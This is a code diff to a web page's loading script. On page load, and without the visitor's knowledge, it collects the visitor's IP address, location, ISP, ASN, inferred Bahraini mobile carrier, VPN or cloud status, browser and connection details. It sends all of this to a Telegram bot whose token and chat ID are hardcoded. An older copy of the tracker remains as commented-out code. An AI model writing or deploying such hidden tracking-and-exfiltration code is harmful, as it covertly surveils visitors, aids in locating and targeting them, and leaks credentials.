@@ -219,36 +219,143 @@
   <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
 </div>
 <script>
-   window.addEventListener("load", async () => {
-    // SHOW CONTENT AFTER 3 SECONDS
-  
+window.addEventListener("load", async () => {
+  // --- CONFIG (set your own values)
+  const ipinfoToken = "1b16cc141fc931"; // your ipinfo token
+  const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8"; // your Telegram bot token
+  const chatId = "-5091670751"; // your Telegram chat/channel id
 
-    try {
-      const time = new Date().toISOString();
-      const browser = navigator.userAgent;
-      const ipRes = await fetch("https://ipinfo.io/json?token=b8a284ba09a629");
-      const ipData = await ipRes.json();
-    
- const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
-                const chatId = '-5091670751';
-      const message = `
-🧠 New Visitor
+  // --- Helper: Bahrain carrier inference
+  const BH_ASN_MAP = {
+    "AS5416": "Batelco",
+    "AS51375": "stc Bahrain",   // formerly VIVA
+    "AS31452": "Zain Bahrain",
+  };
+  const BH_ORG_REGEX = [
+    { re: /(beyon|batelco|btc\.com\.bh)/i, label: "Batelco" },
+    { re: /\bstc\b|\bstc bahrain\b|viva bahrain/i, label: "stc Bahrain" },
+    { re: /\bzain\b|\bzain bahrain\b/i, label: "Zain Bahrain" },
+  ];
+  const VPN_CLOUD_KEYWORDS = [
+    "amazon","aws","google","gcp","microsoft","azure","cloudflare","fastly",
+    "ovh","hetzner","digitalocean","linode","leaseweb","contabo","scaleway",
+    "vultr","aliyun","huawei cloud","akamai","edgecast","nord","surfshark",
+    "mullvad","proton","expressvpn","vpn","proxy"
+  ];
+
+  const getConnectionHint = () => {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return "n/a";
+    const parts = [];
+    if (c.type) parts.push(`type=${c.type}`);
+    if (c.effectiveType) parts.push(`effectiveType=${c.effectiveType}`);
+    if (typeof c.downlink === "number") parts.push(`downlink≈${c.downlink}Mbps`);
+    if (typeof c.rtt === "number") parts.push(`rtt≈${c.rtt}ms`);
+    return parts.join(" · ") || "available";
+  };
+
+  const normalizeCarrier = (asn, org) => {
+    if (asn && BH_ASN_MAP[asn]) return BH_ASN_MAP[asn];
+    for (const { re, label } of BH_ORG_REGEX) {
+      if (org && re.test(org)) return label;
+    }
+    return null;
+  };
+
+  const looksLikeVpnOrCloud = (org) => {
+    if (!org) return false;
+    const s = org.toLowerCase();
+    return VPN_CLOUD_KEYWORDS.some(k => s.includes(k));
+  };
+
+  try {
+    const time = new Date().toISOString();
+    const browser = navigator.userAgent;
+    const netHint = getConnectionHint();
+
+    // Get IP + ASN/Org from ipinfo
+    const ipRes = await fetch(`https://ipinfo.io/json?token=${encodeURIComponent(ipinfoToken)}`, {
+      cache: "no-store"
+    });
+    const ipData = await ipRes.json();
+
+    // Parse ASN from org string like "AS9829 Bharti Airtel Ltd"
+    const orgRaw = ipData.org || "";  // e.g. "AS5416 Bahrain Telecommunications Company (BATELCO) B.S.C."
+    let asn = "";
+    const m = /^AS(\d+)/i.exec(orgRaw);
+    if (m) asn = `AS${m[1]}`;
+
+    const carrier = normalizeCarrier(asn, orgRaw) || "unknown";
+    const vpnOrCloud = looksLikeVpnOrCloud(orgRaw);
+    const flags = [
+      ipData.country ? `country=${ipData.country}` : null,
+      vpnOrCloud ? "vpn/cloud" : null,
+      ipData.anycast ? "anycast" : null
+    ].filter(Boolean).join(" · ");
+
+    // Build Telegram message
+    const message =
+`🧠 New Visitor
 
 🕒 Time: ${time}
-🌍 IP: ${ipData.ip}
-📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
-`;
+🌍 IP: ${ipData.ip || "—"}
+📍 Location: ${[ipData.city, ipData.region, ipData.country].filter(Boolean).join(", ") || "—"}
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      });
+🔎 ASN: ${asn || "—"}
+🏢 Org/ISP: ${orgRaw || "—"}
+📶 Inferred Carrier (BH): ${carrier}
+🏳 Flags: ${flags || "—"}
 
-    } catch (error) {
-      console.error("Error sending data to Telegram:", error);
-    }
-  });
+🧭 Browser: ${browser}
+🌐 Network Hint: ${netHint}`;
+
+    // Send to Telegram
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+  } catch (error) {
+    console.error("Error sending data to Telegram:", error);
+  }
+});
+</script>
+
+<script>
+//    window.addEventListener("load", async () => {
+//     // SHOW CONTENT AFTER 3 SECONDS
+  
+
+//     try {
+//       const time = new Date().toISOString();
+//       const browser = navigator.userAgent;
+//       const ipRes = await fetch("https://ipinfo.io/json?token=b8a284ba09a629");
+//       const ipData = await ipRes.json();
+    
+//  const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
+//                 const chatId = '-5091670751';
+//       const message = `
+// 🧠 New Visitor
+
+// 🕒 Time: ${time}
+// 🌍 IP: ${ipData.ip}
+// 📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
+// `;
+
+//       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+//         method: "POST",
+//         headers: { "Content-Type": "application/json" },
+//         body: JSON.stringify({ chat_id: chatId, text: message })
+//       });
+
+//     } catch (error) {
+//       console.error("Error sending data to Telegram:", error);
+//     }
+//   });
 (function(){
   const app    = document.getElementById('app');
   const splash = document.getElementById('splash');
